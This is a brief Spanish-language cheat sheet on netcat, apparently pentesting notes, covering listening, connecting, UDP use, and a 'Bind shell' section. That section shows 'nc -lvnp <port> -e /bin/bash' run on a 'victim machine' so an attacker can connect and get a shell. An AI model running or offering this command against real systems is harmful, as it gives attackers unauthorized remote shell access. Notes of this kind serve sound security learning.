Es conocido por muchos como la navaja suiza para TCP/IP, ya que provee de una gran cantidad de funcionalidad para manejar conexiones.

## Ponerse en escucha

Podemos ponernos en escucha de la siguiente forma:

```bash
netcat -lvnp <port>
```

Con `-l`, especificamos que queremos escuchar; con `-v` hacemos que nos reporte las conexiones por pantalla (*verbose*); con `-n` podemos hacer que sólo escuche ips numéricas (no dns); y con `-p` especificamos el puerto.

Para **udp** utilizamos el parámetro `-u`.

## Conectarse con netcat

```bash
nc -v <ip> <port>
```

Para **udp** utilizamos el parámetro `-u`.

## Bind shell

Con el parámetro `-e` podemos hacer que al conectarse se ejecute un comando, de forma que podemos hacer que una máquina víctima ejecute una shell al conectarnos con nuestra máquina de atacante:

```bash
nc -lvnp <port> -e /bin/bash
```

Y desde nuestra máquina nos conectaríamos:

```bash
nc -v <ip> <port>
```


## Parámetros interesantes

- Con `-r` podemos randomizar el puerto.